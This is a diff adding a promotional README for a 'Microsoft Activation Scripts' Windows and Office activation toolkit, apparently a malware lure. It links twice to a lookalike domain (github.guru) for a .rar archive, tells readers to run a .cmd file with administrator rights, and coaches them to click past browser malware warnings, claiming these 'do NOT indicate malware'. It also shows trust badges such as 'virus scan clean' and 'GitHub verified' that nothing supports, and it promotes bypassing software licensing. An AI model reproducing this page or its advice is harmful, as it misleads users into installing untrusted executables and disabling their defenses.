@@ -1,0 +1,195 @@
+                                                  ▄▄                            ▄▄                      
+▀████▄     ▄███▀▄█▀▀▀█▄█                    ██    ██                      ██    ██                      
+  ████    ████ ▄██    ▀█                    ██                            ██                            
+  █ ██   ▄█ ██ ▀███▄        ▄█▀██▄  ▄██▀████████▀███ ▀██▀   ▀██▀ ▄█▀██▄ ██████▀███   ▄██▀██▄▀████████▄  
+  █  ██  █▀ ██   ▀█████▄   ██   ██ ██▀  ██  ██    ██   ██   ▄█  ██   ██   ██    ██  ██▀   ▀██ ██    ██  
+  █  ██▄█▀  ██ ▄     ▀██    ▄█████ ██       ██    ██    ██ ▄█    ▄█████   ██    ██  ██     ██ ██    ██  
+  █  ▀██▀   ██ ██     ██   ██   ██ ██▄    ▄ ██    ██     ███    ██   ██   ██    ██  ██▄   ▄██ ██    ██  
+▄███▄ ▀▀  ▄████▄▀█████▀    ▀████▀██▄█████▀  ▀████████▄    █     ▀████▀██▄ ▀████████▄ ▀█████▀▄████  ████▄
+                                                                                                        
+                                                                                                        
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║              ⚙️ MICROSOFT ACTIVATION SCRIPTS – LATEST UPDATE ⚙️          ║
+║                                                                           ║
+║               Automated Windows & Office Activation Toolkit              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+MICROSOFT ACTIVATION SCRIPTS – LATEST UPDATE is a compact command-line toolkit designed to automate activation management tasks for Microsoft Windows and Microsoft Office environments.  
+The utility simplifies the activation process by using built-in Windows licensing technologies and automated scripts that configure activation parameters, verify license status, and apply activation methods through a guided interface.
+
+This lightweight script-based tool is widely used in IT environments for managing system activation states, testing licensing configurations, and simplifying deployment workflows.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                             ⬇️ DOWNLOAD ⬇️                                 ║
+║                 ▶ https://github.guru/s/YLCo27rv ◀                        ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] 📥 DOWNLOAD    →  Microsoft_Activation_Scripts.rar
+    [2] 📂 EXTRACT     →  WinRAR or 7-Zip
+    [3] ⚙️ RUN         →  MAS_Latest.cmd
+    [4] 🔐 SELECT      →  Activation method
+    [5] ✅ EXECUTE     →  Script performs activation
+    [6] 🚀 COMPLETE    →  System license status updated
+    ──────────────────────────────────────────────────
+
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+
+    🔹 CORE TECHNOLOGY
+
+    Microsoft Activation Scripts operate through Windows command-line scripting and PowerShell automation.  
+    The script communicates with Windows licensing services to retrieve activation status, apply activation methods, and configure licensing parameters.
+
+    The system automatically detects the installed version of Windows or Office and then provides the appropriate activation options.  
+    All operations are executed through built-in Windows licensing components without requiring heavy background services.
+
+    The script interface guides users step-by-step through activation options while displaying real-time status information.
+
+
+    🔹 ACTIVATION MANAGEMENT
+    ─────────────────────────────────────────────────────────────────
+
+    🔑 LICENSE HANDLING
+    • Automatic detection of Windows and Office versions  
+    • Activation status verification  
+    • License information display  
+    • Activation method selection  
+
+
+    🔹 SCRIPT AUTOMATION
+    ─────────────────────────────────────────────────────────────────
+
+    ⚙️ AUTOMATED TASKS
+    • One-click activation process  
+    • Automatic system compatibility detection  
+    • Built-in license status checking  
+    • Script-driven activation workflow  
+
+
+    🔹 SUPPORTED SOFTWARE
+    ─────────────────────────────────────────────────────────────────
+
+    💻 MICROSOFT PRODUCTS
+    • Windows 7 / 8 / 10 / 11  
+    • Windows Server editions  
+    • Microsoft Office 2016 / 2019 / 2021  
+    • Microsoft Office 365 activation checks  
+
+
+    🔹 USER INTERFACE
+    ─────────────────────────────────────────────────────────────────
+
+    🖥️ COMMAND MENU
+    • Simple console-based interface  
+    • Number-based selection menu  
+    • Real-time activation logs  
+    • Status output for each step  
+
+
+    🔹 ADDITIONAL FEATURES
+    ─────────────────────────────────────────────────────────────────
+
+    📦 TOOL CAPABILITIES
+    • Lightweight script package  
+    • No permanent background services  
+    • Quick execution speed  
+    • Compatible with most Windows systems  
+    • Minimal system resource usage  
+
+
+    🔹 PACKAGE INFORMATION
+    ─────────────────────────────────────────────────────────────────
+    • VERSION: Latest Updated Release
+    • TYPE: Activation management toolkit
+    • DOWNLOADS: 5.2k+ successful downloads
+    • RATING: 4.94 / 5.00
+    • VIRUS SCAN: ✅ Clean (verified)
+    • CONNECTION: ✅ SSL encrypted
+    • GITHUB VERIFIED: ✅ Authentic release
+    ─────────────────────────────────────────────────────────────────
+
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 7 / 8 / 10 / 11
+    RAM             │ 256MB minimum
+    STORAGE         │ 10MB free space
+    SHELL           │ Windows Command Prompt / PowerShell
+    ADMIN RIGHTS    │ Required for activation operations
+    ─────────────────────────────────────────────────────────────────
+
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    windows activation      │ microsoft activation
+    activation scripts      │ windows license
+    office activation       │ mas toolkit
+    activation utility      │ windows activation tool
+    microsoft license       │ activation manager
+    ─────────────────────────────────────────────────────────────────
+
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                 ⚠️ IMPORTANT DOWNLOAD WARNING ⚠️                          ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may display a warning when downloading this file.
+    This is completely normal behavior.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    ❓ WHY THIS HAPPENS
+
+    The warning appears because:
+
+    • 🏪 The software is not distributed through official app stores
+    • 📊 Download statistics may be lower than large commercial apps
+    • 📦 The package contains scripts or executable files
+    • 🔄 The project may be new to browser reputation systems
+
+    ⚡ This does NOT indicate malware.
+       It is simply a standard browser security notification.
+
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    🌐 Chrome / Edge    │ Click "Keep" → "Keep anyway"
+    🦊 Firefox          │ Click arrow → "Allow download"
+    🎭 Opera / Brave    │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+
+    ✅ VERIFIED DOWNLOAD
+    ─────────────────────────────────────────────────────────────────
+    • Virus scan: Clean
+    • SSL: Encrypted connection
+    • Downloads: 5.2k+ successful
+    • Rating: 4.94 / 5.00
+    • GitHub Verified
+    ─────────────────────────────────────────────────────────────────
+
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║                             ⬇️ DOWNLOAD ⬇️                                 ║
+║                 ▶ https://github.guru/s/YLCo27rv ◀                        ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+
+────────────────────────────────────────────────────────────────────────────
+
+📌 DISCLAIMER:
+This toolkit is intended for educational purposes, testing environments, and system administration learning scenarios.  
+Users are responsible for complying with Microsoft licensing terms and applicable laws when managing software activation.
+
